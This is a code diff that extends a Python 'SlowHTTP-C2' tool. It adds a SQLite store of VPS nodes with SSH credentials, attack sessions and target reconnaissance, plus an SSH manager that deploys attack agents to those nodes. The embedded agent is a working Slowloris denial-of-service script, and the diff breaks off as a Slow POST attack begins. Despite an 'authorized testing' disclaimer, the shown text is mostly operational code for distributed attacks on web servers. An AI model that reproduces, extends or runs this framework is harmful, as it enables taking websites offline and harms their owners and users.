@@ -98,7 +98,7 @@ logging.basicConfig(
 logger = logging.getLogger("SlowHTTP-C2")
 
 # Version information
-VERSION = "4.0"
+VERSION = "5.0"
 BUILD_DATE = "2025-09-27"
 
 class Colors:
@@ -190,26 +190,14 @@ class SecurityManager:
             else:
                 # This is just a placeholder - in reality, you can't decrypt the fallback method
                 # It would need to be replaced with a proper implementation
-                logger.warning("Attempted to decrypt with fallback method - not supported")
-                return ""
+                logger.warning("Attempted to decrypt with fallback method, which is not fully reversible")
+                return encrypted_password
         except Exception as e:
             logger.error(f"Decryption error: {str(e)}")
             return ""
     
-    def hash_data(self, data):
-        """Create a secure hash of data"""
-        if not data:
-            return ""
-        try:
-            return hashlib.sha256(str(data).encode()).hexdigest()
-        except Exception as e:
-            logger.error(f"Hashing error: {str(e)}")
-            return ""
-    
     def validate_ip(self, ip):
-        """Validate if string is a valid IP address"""
-        if not ip:
-            return False
+        """Validate IP address format"""
         try:
             ipaddress.ip_address(ip)
             return True
@@ -217,20 +205,16 @@ class SecurityManager:
             return False
     
     def validate_port(self, port):
-        """Validate if value is a valid port number"""
+        """Validate port number"""
         try:
             port_num = int(port)
             return 1 <= port_num <= 65535
-        except (ValueError, TypeError):
+        except ValueError:
             return False
     
     def validate_url(self, url):
-        """Validate if string is a valid URL"""
-        if not url:
-            return False
+        """Validate URL format"""
         try:
-            if not url.startswith(('http://', 'https://')):
-                url = 'http://' + url
             result = urlparse(url)
             return all([result.scheme, result.netloc])
         except:
@@ -242,7 +226,7 @@ class SecurityManager:
             return ""
         
         # Remove dangerous characters
-        sanitized = re.sub(r'[;\'"\\]', '', str(input_str))
+        sanitized = re.sub(r'[;\'&quot;\\\]', '', str(input_str))
         
         # Limit length if specified
         if max_length and len(sanitized) > max_length:
@@ -250,29 +234,3744 @@ class SecurityManager:
             
         return sanitized
 
-def main():
-    """Main function to run the application"""
-    # Check Python version
-    if sys.version_info < (3, 6):
-        print("Python 3.6+ required")
-        sys.exit(1)
+class DatabaseManager:
+    """Manages database operations for the C2 server"""
     
-    # Create necessary directories
-    os.makedirs('logs', exist_ok=True)
+    def __init__(self, db_file='c2_database.db'):
+        """Initialize database manager with specified database file"""
+        self.db_file = db_file
+        self.init_database()
     
-    # Initialize and run TUI
-    try:
-        print("Starting Distributed Slow HTTP C2 - ADVANCED EDITION...")
-        tui = SlowHTTPTUI()
-        tui.run()
-    except Exception as e:
-        logger.critical(f"Fatal error: {str(e)}")
-        logger.critical(traceback.format_exc())
-        print(f"Fatal error: {e}")
-        sys.exit(1)
+    def init_database(self):
+        """Initialize database schema with all required tables"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # VPS nodes table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS vps_nodes (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    ip_address TEXT NOT NULL UNIQUE,
+                    username TEXT NOT NULL,
+                    password TEXT NOT NULL,
+                    ssh_port INTEGER DEFAULT 22,
+                    status TEXT DEFAULT 'offline',
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    last_seen TIMESTAMP,
+                    location TEXT,
+                    tags TEXT,
+                    system_info TEXT
+                )
+            ''')
+            
+            # Attack sessions table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS attack_sessions (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    session_name TEXT NOT NULL,
+                    target_url TEXT NOT NULL,
+                    target_host TEXT,
+                    attack_type TEXT NOT NULL,
+                    vps_nodes TEXT,
+                    start_time TIMESTAMP,
+                    end_time TIMESTAMP,
+                    status TEXT DEFAULT 'pending',
+                    parameters TEXT,
+                    results TEXT,
+                    notes TEXT,
+                    target_info TEXT
+                )
+            ''')
+            
+            # Attack results table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS attack_results (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    session_id INTEGER,
+                    vps_ip TEXT,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    connections_active INTEGER DEFAULT 0,
+                    packets_sent INTEGER DEFAULT 0,
+                    bytes_sent INTEGER DEFAULT 0,
+                    error_count INTEGER DEFAULT 0,
+                    cpu_usage REAL,
+                    memory_usage REAL,
+                    response_codes TEXT,
+                    status TEXT,
+                    FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
+                )
+            ''')
+            
+            # Target information table
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS targets (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    domain TEXT NOT NULL UNIQUE,
+                    ip_addresses TEXT,
+                    web_server TEXT,
+                    waf_detected BOOLEAN DEFAULT 0,
+                    waf_type TEXT,
+                    cloudflare_protected BOOLEAN DEFAULT 0,
+                    open_ports TEXT,
+                    dns_records TEXT,
+                    ssl_info TEXT,
+                    whois_info TEXT,
+                    last_scan TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    notes TEXT
+                )
+            ''')
+            
+            conn.commit()
+            logger.info("Database initialized successfully")
+        except sqlite3.Error as e:
+            logger.error(f"Database initialization error: {str(e)}")
+        finally:
+            if conn:
+                conn.close()
+    
+    def add_vps(self, ip_address, username, encrypted_password, ssh_port=22, location=None, tags=None):
+        """Add a new VPS node to the database"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Check if VPS already exists
+            cursor.execute("SELECT id FROM vps_nodes WHERE ip_address = ?", (ip_address,))
+            if cursor.fetchone():
+                return None, "VPS with this IP address already exists"
+            
+            # Prepare tags as JSON
+            tags_json = json.dumps(tags) if tags else None
+            
+            # Insert new VPS
+            cursor.execute('''
+                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location, tags)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (ip_address, username, encrypted_password, ssh_port, location, tags_json))
+            
+            conn.commit()
+            vps_id = cursor.lastrowid
+            logger.info(f"Added new VPS: {ip_address}")
+            return vps_id, "VPS added successfully"
+        except sqlite3.Error as e:
+            logger.error(f"Error adding VPS: {str(e)}")
+            return None, f"Database error: {str(e)}"
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_vps(self, ip_address):
+        """Get VPS details by IP address"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT * FROM vps_nodes WHERE ip_address = ?", (ip_address,))
+            vps = cursor.fetchone()
+            
+            if vps:
+                return dict(vps)
+            else:
+                return None
+        except sqlite3.Error as e:
+            logger.error(f"Error getting VPS: {str(e)}")
+            return None
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_all_vps(self):
+        """Get all VPS nodes"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT * FROM vps_nodes ORDER BY id")
+            vps_list = [dict(row) for row in cursor.fetchall()]
+            
+            return vps_list
+        except sqlite3.Error as e:
+            logger.error(f"Error getting all VPS: {str(e)}")
+            return []
+        finally:
+            if conn:
+                conn.close()
+    
+    def update_vps_status(self, ip_address, status, message=None):
+        """Update VPS status and last_seen timestamp"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Update status and last_seen
+            cursor.execute('''
+                UPDATE vps_nodes 
+                SET status = ?, last_seen = CURRENT_TIMESTAMP
+                WHERE ip_address = ?
+            ''', (status, ip_address))
+            
+            conn.commit()
+            return True
+        except sqlite3.Error as e:
+            logger.error(f"Error updating VPS status: {str(e)}")
+            return False
+        finally:
+            if conn:
+                conn.close()
+    
+    def update_vps_system_info(self, ip_address, system_info):
+        """Update VPS system information"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Convert system_info dict to JSON
+            system_info_json = json.dumps(system_info)
+            
+            # Update system_info
+            cursor.execute('''
+                UPDATE vps_nodes 
+                SET system_info = ?
+                WHERE ip_address = ?
+            ''', (system_info_json, ip_address))
+            
+            conn.commit()
+            return True
+        except sqlite3.Error as e:
+            logger.error(f"Error updating VPS system info: {str(e)}")
+            return False
+        finally:
+            if conn:
+                conn.close()
+    
+    def remove_vps(self, ip_address):
+        """Remove a VPS node from the database"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Delete VPS
+            cursor.execute("DELETE FROM vps_nodes WHERE ip_address = ?", (ip_address,))
+            
+            conn.commit()
+            return True
+        except sqlite3.Error as e:
+            logger.error(f"Error removing VPS: {str(e)}")
+            return False
+        finally:
+            if conn:
+                conn.close()
+    
+    def create_attack_session(self, session_name, target_url, attack_type, vps_nodes, parameters):
+        """Create a new attack session"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Parse target URL to get host
+            parsed = urlparse(target_url)
+            target_host = parsed.netloc or parsed.path.split('/')[0]
+            
+            # Convert parameters dict to JSON
+            parameters_json = json.dumps(parameters)
+            
+            # Convert VPS nodes list to comma-separated string
+            vps_nodes_str = ','.join(vps_nodes)
+            
+            # Insert new attack session
+            cursor.execute('''
+                INSERT INTO attack_sessions 
+                (session_name, target_url, target_host, attack_type, vps_nodes, parameters, status, start_time)
+                VALUES (?, ?, ?, ?, ?, ?, 'running', CURRENT_TIMESTAMP)
+            ''', (session_name, target_url, target_host, attack_type, vps_nodes_str, parameters_json))
+            
+            conn.commit()
+            session_id = cursor.lastrowid
+            logger.info(f"Created attack session: {session_name} (ID: {session_id})")
+            return session_id
+        except sqlite3.Error as e:
+            logger.error(f"Error creating attack session: {str(e)}")
+            return None
+        finally:
+            if conn:
+                conn.close()
+    
+    def update_attack_status(self, session_id, status, results=None):
+        """Update attack session status"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            if status == 'completed' or status == 'failed':
+                # Set end time if attack is completed or failed
+                cursor.execute('''
+                    UPDATE attack_sessions 
+                    SET status = ?, end_time = CURRENT_TIMESTAMP, results = ?
+                    WHERE id = ?
+                ''', (status, results, session_id))
+            else:
+                # Just update status
+                cursor.execute('''
+                    UPDATE attack_sessions 
+                    SET status = ?
+                    WHERE id = ?
+                ''', (status, session_id))
+            
+            conn.commit()
+            return True
+        except sqlite3.Error as e:
+            logger.error(f"Error updating attack status: {str(e)}")
+            return False
+        finally:
+            if conn:
+                conn.close()
+    
+    def add_attack_result(self, session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes, status):
+        """Add attack result data"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Convert response_codes dict to JSON
+            response_codes_json = json.dumps(response_codes) if response_codes else None
+            
+            # Insert attack result
+            cursor.execute('''
+                INSERT INTO attack_results 
+                (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes, status)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (session_id, vps_ip, connections_active, packets_sent, bytes_sent, error_count, cpu_usage, memory_usage, response_codes_json, status))
+            
+            conn.commit()
+            return True
+        except sqlite3.Error as e:
+            logger.error(f"Error adding attack result: {str(e)}")
+            return False
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_attack_session(self, session_id):
+        """Get attack session details by ID"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT * FROM attack_sessions WHERE id = ?", (session_id,))
+            session = cursor.fetchone()
+            
+            if session:
+                return dict(session)
+            else:
+                return None
+        except sqlite3.Error as e:
+            logger.error(f"Error getting attack session: {str(e)}")
+            return None
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_attack_sessions(self, limit=None):
+        """Get all attack sessions with optional limit"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            if limit:
+                cursor.execute("SELECT * FROM attack_sessions ORDER BY id DESC LIMIT ?", (limit,))
+            else:
+                cursor.execute("SELECT * FROM attack_sessions ORDER BY id DESC")
+                
+            sessions = [dict(row) for row in cursor.fetchall()]
+            
+            return sessions
+        except sqlite3.Error as e:
+            logger.error(f"Error getting attack sessions: {str(e)}")
+            return []
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_active_attack_sessions(self):
+        """Get all active attack sessions"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT * FROM attack_sessions WHERE status = 'running' ORDER BY id DESC")
+            sessions = [dict(row) for row in cursor.fetchall()]
+            
+            return sessions
+        except sqlite3.Error as e:
+            logger.error(f"Error getting active attack sessions: {str(e)}")
+            return []
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_attack_results(self, session_id, limit=None):
+        """Get attack results for a session with optional limit"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            if limit:
+                cursor.execute('''
+                    SELECT * FROM attack_results 
+                    WHERE session_id = ? 
+                    ORDER BY timestamp DESC LIMIT ?
+                ''', (session_id, limit))
+            else:
+                cursor.execute('''
+                    SELECT * FROM attack_results 
+                    WHERE session_id = ? 
+                    ORDER BY timestamp DESC
+                ''', (session_id,))
+                
+            results = [dict(row) for row in cursor.fetchall()]
+            
+            return results
+        except sqlite3.Error as e:
+            logger.error(f"Error getting attack results: {str(e)}")
+            return []
+        finally:
+            if conn:
+                conn.close()
+    
+    def add_target_info(self, domain, ip_addresses=None, web_server=None, waf_detected=False, waf_type=None, cloudflare_protected=False, open_ports=None, dns_records=None, ssl_info=None, whois_info=None, notes=None):
+        """Add or update target information"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            cursor = conn.cursor()
+            
+            # Convert data to JSON
+            ip_addresses_json = json.dumps(ip_addresses) if ip_addresses else None
+            open_ports_json = json.dumps(open_ports) if open_ports else None
+            dns_records_json = json.dumps(dns_records) if dns_records else None
+            ssl_info_json = json.dumps(ssl_info) if ssl_info else None
+            whois_info_json = json.dumps(whois_info) if whois_info else None
+            
+            # Check if target already exists
+            cursor.execute("SELECT id FROM targets WHERE domain = ?", (domain,))
+            existing = cursor.fetchone()
+            
+            if existing:
+                # Update existing target
+                cursor.execute('''
+                    UPDATE targets 
+                    SET ip_addresses = ?, web_server = ?, waf_detected = ?, waf_type = ?,
+                        cloudflare_protected = ?, open_ports = ?, dns_records = ?,
+                        ssl_info = ?, whois_info = ?, last_scan = CURRENT_TIMESTAMP,
+                        notes = ?
+                    WHERE domain = ?
+                ''', (ip_addresses_json, web_server, waf_detected, waf_type, cloudflare_protected, open_ports_json, dns_records_json, ssl_info_json, whois_info_json, notes, domain))
+                
+                target_id = existing[0]
+                logger.info(f"Updated target information: {domain}")
+            else:
+                # Insert new target
+                cursor.execute('''
+                    INSERT INTO targets 
+                    (domain, ip_addresses, web_server, waf_detected, waf_type, cloudflare_protected, open_ports, dns_records, ssl_info, whois_info, notes)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (domain, ip_addresses_json, web_server, waf_detected, waf_type, cloudflare_protected, open_ports_json, dns_records_json, ssl_info_json, whois_info_json, notes))
+                
+                target_id = cursor.lastrowid
+                logger.info(f"Added new target: {domain}")
+            
+            conn.commit()
+            return target_id
+        except sqlite3.Error as e:
+            logger.error(f"Error adding target info: {str(e)}")
+            return None
+        finally:
+            if conn:
+                conn.close()
+    
+    def get_target_info(self, domain):
+        """Get target information by domain"""
+        conn = None
+        try:
+            conn = sqlite3.connect(self.db_file)
+            conn.row_factory = sqlite3.Row
+            cursor = conn.cursor()
+            
+            cursor.execute("SELECT * FROM targets WHERE domain = ?", (domain,))
+            target = cursor.fetchone()
+            
+            if target:
+                target_dict = dict(target)
+                
+                # Parse JSON fields
+                for field in ['ip_addresses', 'open_ports', 'dns_records', 'ssl_info', 'whois_info']:
+                    if target_dict.get(field):
+                        try:
+                            target_dict[field] = json.loads(target_dict[field])
+                        except:
+                            target_dict[field] = None
+                
+                return target_dict
+            else:
+                return None
+        except sqlite3.Error as e:
+            logger.error(f"Error getting target info: {str(e)}")
+            return None
+        finally:
+            if conn:
+                conn.close()
+    
+    def close(self):
+        """Close any open database connections"""
+        # SQLite connections are opened and closed for each operation
+        # This method is included for consistency with other managers
+        pass
 
-if __name__ == '__main__':
+class SSHManager:
+    """Manages SSH connections to VPS nodes"""
+    
+    def __init__(self, security_manager):
+        """Initialize SSH manager with security manager for password handling"""
+        self.connections = {}
+        self.security_manager = security_manager
+        self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
+    
+    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
+        """Connect to a VPS with comprehensive error handling"""
+        if not SSH_AVAILABLE:
+            return False, "SSH functionality not available (paramiko not installed)"
+            
+        try:
+            password = self.security_manager.decrypt_password(encrypted_password)
+            
+            # Cache credentials for auto-reconnect
+            self.connection_cache[ip] = {
+                'username': username,
+                'encrypted_password': encrypted_password,
+                'port': port
+            }
+            
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # Try to connect with timeout
+            ssh.connect(
+                hostname=ip,
+                username=username,
+                password=password,
+                port=port,
+                timeout=timeout
+            )
+            
+            self.connections[ip] = ssh
+            return True, "Connected successfully"
+            
+        except paramiko.AuthenticationException:
+            return False, "Authentication failed - check username and password"
+        except paramiko.SSHException as e:
+            return False, f"SSH error: {str(e)}"
+        except socket.timeout:
+            return False, "Connection timed out"
+        except socket.error as e:
+            return False, f"Socket error: {str(e)}"
+        except Exception as e:
+            return False, str(e)
+    
+    def reconnect_vps(self, ip):
+        """Attempt to reconnect to VPS using cached credentials"""
+        if ip not in self.connection_cache:
+            return False, "No cached credentials for this VPS"
+        
+        cached = self.connection_cache[ip]
+        return self.connect_vps(
+            ip, 
+            cached['username'], 
+            cached['encrypted_password'], 
+            cached['port']
+        )
+    
+    def disconnect_vps(self, ip):
+        """Disconnect from a VPS"""
+        if ip in self.connections:
+            try:
+                self.connections[ip].close()
+                del self.connections[ip]
+                return True
+            except Exception as e:
+                logger.error(f"Error disconnecting from {ip}: {str(e)}")
+        return False
+    
+    def execute_command(self, ip, command, timeout=60, auto_reconnect=True):
+        """Execute command with auto-reconnect capability"""
+        
+        # Check if connection exists, try to reconnect if not
+        if ip not in self.connections:
+            if auto_reconnect:
+                logger.info(f"No connection to {ip}, attempting reconnect...")
+                success, message = self.reconnect_vps(ip)
+                if not success:
+                    return False, f"Reconnection failed: {message}"
+            else:
+                return False, "No connection to VPS"
+        
+        try:
+            stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
+            
+            # Wait for command completion
+            exit_status = stdout.channel.recv_exit_status()
+            
+            # Get output
+            output = stdout.read().decode('utf-8', errors='replace')
+            error = stderr.read().decode('utf-8', errors='replace')
+            
+            if exit_status != 0:
+                logger.warning(f"Command on {ip} exited with status {exit_status}: {error}")
+                return False, error or "Command failed with no error message"
+            
+            return True, output
+        except socket.timeout:
+            logger.error(f"Command timed out on {ip}")
+            return False, "Command timed out"
+        except paramiko.SSHException as e:
+            logger.error(f"SSH error on {ip}: {str(e)}")
+            
+            # Try to reconnect if connection was lost
+            if auto_reconnect:
+                logger.info(f"Attempting to reconnect to {ip}...")
+                success, message = self.reconnect_vps(ip)
+                if success:
+                    logger.info(f"Reconnected to {ip}, retrying command...")
+                    return self.execute_command(ip, command, timeout, False)  # Prevent infinite recursion
+                else:
+                    return False, f"Reconnection failed: {message}"
+            
+            return False, f"SSH error: {str(e)}"
+        except Exception as e:
+            logger.error(f"Error executing command on {ip}: {str(e)}")
+            return False, str(e)
+    
+    def deploy_agent(self, ip, agent_type="standard"):
+        """Deploy attack agent to VPS"""
+        if ip not in self.connections:
+            return False, "No connection to VPS"
+        
+        try:
+            # Create directory for agent
+            mkdir_cmd = "mkdir -p ~/slowhttp_agent"
+            success, output = self.execute_command(ip, mkdir_cmd)
+            if not success:
+                return False, f"Failed to create agent directory: {output}"
+            
+            # Get appropriate agent script
+            if agent_type == "advanced":
+                agent_script = self._get_advanced_agent_script()
+            else:
+                agent_script = self._get_standard_agent_script()
+            
+            # Write script to file
+            write_cmd = f"cat > ~/slowhttp_agent/agent.py << 'EOL'\n{agent_script}\nEOL"
+            success, output = self.execute_command(ip, write_cmd)
+            if not success:
+                return False, f"Failed to write agent script: {output}"
+            
+            # Make script executable
+            chmod_cmd = "chmod +x ~/slowhttp_agent/agent.py"
+            success, output = self.execute_command(ip, chmod_cmd)
+            if not success:
+                return False, f"Failed to make agent executable: {output}"
+            
+            # Test agent
+            test_cmd = "cd ~/slowhttp_agent && python3 agent.py --version"
+            success, output = self.execute_command(ip, test_cmd)
+            if not success:
+                return False, f"Agent test failed: {output}"
+            
+            logger.info(f"Successfully deployed {agent_type} agent to {ip}")
+            return True, "Agent deployed successfully"
+        except Exception as e:
+            logger.error(f"Error deploying agent to {ip}: {str(e)}")
+            return False, str(e)
+    
+    def get_system_info(self, ip):
+        """Get system information from VPS"""
+        if ip not in self.connections:
+            return None
+        
+        try:
+            # Create a command to gather system information
+            cmd = """
+            echo "{"
+            echo "  \&quot;hostname\&quot;: \&quot;$(hostname)\&quot;,"
+            echo "  \&quot;os\&quot;: \&quot;$(cat /etc/os-release | grep PRETTY_NAME | cut -d '=' -f 2 | tr -d '\&quot;')\&quot;,"
+            echo "  \&quot;kernel\&quot;: \&quot;$(uname -r)\&quot;,"
+            echo "  \&quot;cpu\&quot;: \&quot;$(grep 'model name' /proc/cpuinfo | head -1 | cut -d ':' -f 2 | xargs)\&quot;,"
+            echo "  \&quot;cpu_cores\&quot;: $(grep -c processor /proc/cpuinfo),"
+            echo "  \&quot;memory_total\&quot;: \&quot;$(free -h | grep Mem | awk '{print $2}')\&quot;,"
+            echo "  \&quot;memory_used\&quot;: \&quot;$(free -h | grep Mem | awk '{print $3}')\&quot;,"
+            echo "  \&quot;disk_total\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $2}')\&quot;,"
+            echo "  \&quot;disk_used\&quot;: \&quot;$(df -h / | tail -1 | awk '{print $3}')\&quot;,"
+            echo "  \&quot;python_version\&quot;: \&quot;$(python3 --version 2>&1)\&quot;,"
+            echo "  \&quot;uptime\&quot;: \&quot;$(uptime -p)\&quot;"
+            echo "}"
+            """
+            
+            success, output = self.execute_command(ip, cmd)
+            if not success:
+                return None
+            
+            # Parse JSON output
+            try:
+                system_info = json.loads(output)
+                return system_info
+            except json.JSONDecodeError:
+                logger.error(f"Failed to parse system info from {ip}: {output}")
+                return None
+        except Exception as e:
+            logger.error(f"Error getting system info from {ip}: {str(e)}")
+            return None
+    
+    def get_connection_status(self, ip):
+        """Check if connection to VPS is active"""
+        return ip in self.connections
+    
+    def _get_standard_agent_script(self):
+        """Get the standard agent script for slowloris and slow POST attacks"""
+        return '''#!/usr/bin/env python3
+"""
+SlowHTTP Attack Agent - Standard Edition
+For educational and authorized testing purposes only
+"""
+
+import socket
+import random
+import time
+import sys
+import argparse
+import ssl
+import os
+import signal
+import threading
+import json
+from urllib.parse import urlparse
+
+VERSION = "3.0"
+
+class SlowHTTPAttacker:
+    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
+        self.target = target
+        self.port = port
+        self.use_ssl = use_ssl
+        self.path = path
+        self.running = False
+        self.connections = []
+        self.lock = threading.Lock()
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        # Generate random user agent if not provided
+        if not user_agent:
+            user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
+            ]
+            self.user_agent = random.choice(user_agents)
+        else:
+            self.user_agent = user_agent
+    
+    def slowloris_attack(self, num_connections, delay, duration):
+        """Slowloris (Keep-Alive) attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send initial HTTP request headers (incomplete)
+                    request = f"GET {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    request += "Cache-Control: no-cache\\r\\n"
+                    
+                    # Send initial headers
+                    s.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(s)
+                    
+                    # Sleep briefly between connections
+                    if i % 100 == 0:
+                        time.sleep(0.1)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 100 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} connections")
+            
+            # Keep connections alive by sending partial headers
+            while time.time() < end_time and self.running:
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Send a partial header to keep connection alive
+                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
+                        s.send(partial_header.encode())
+                        
+                        # Update stats
+                        with self.lock:
+                            self.stats["packets_sent"] += 1
+                            self.stats["bytes_sent"] += len(partial_header)
+                            
+                    except Exception as e:
+                        # Connection closed or error, remove it
+                        with self.lock:
+                            self.stats["connections_active"] -= 1
+                            self.stats["error_count"] += 1
+                        
+                        try:
+                            self.connections.remove(s)
+                        except:
+                            pass
+                        
+                        # Try to create a new connection
+                        try:
+                            # Create socket
+                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            new_s.settimeout(5)
+                            
+                            # Connect to target
+                            new_s.connect((self.target, self.port))
+                            
+                            # Wrap with SSL if needed
+                            if self.use_ssl:
+                                context = ssl.create_default_context()
+                                context.check_hostname = False
+                                context.verify_mode = ssl.CERT_NONE
+                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
+                            
+                            # Send initial HTTP request headers (incomplete)
+                            request = f"GET {self.path} HTTP/1.1\\r\\n"
+                            request += f"Host: {self.target}\\r\\n"
+                            request += f"User-Agent: {self.user_agent}\\r\\n"
+                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                            request += "Accept-Encoding: gzip, deflate\\r\\n"
+                            request += "Connection: keep-alive\\r\\n"
+                            request += "Cache-Control: no-cache\\r\\n"
+                            
+                            # Send initial headers
+                            new_s.send(request.encode())
+                            
+                            # Update stats
+                            with self.lock:
+                                self.stats["connections_active"] += 1
+                                self.stats["packets_sent"] += 1
+                                self.stats["bytes_sent"] += len(request)
+                            
+                            # Add to connections list
+                            self.connections.append(new_s)
+                            
+                        except Exception:
+                            # Failed to create new connection, just continue
+                            pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before sending more headers
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def slow_post_attack(self, num_connections, delay, duration):
+        """Slow POST attack (R.U.D.Y)"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
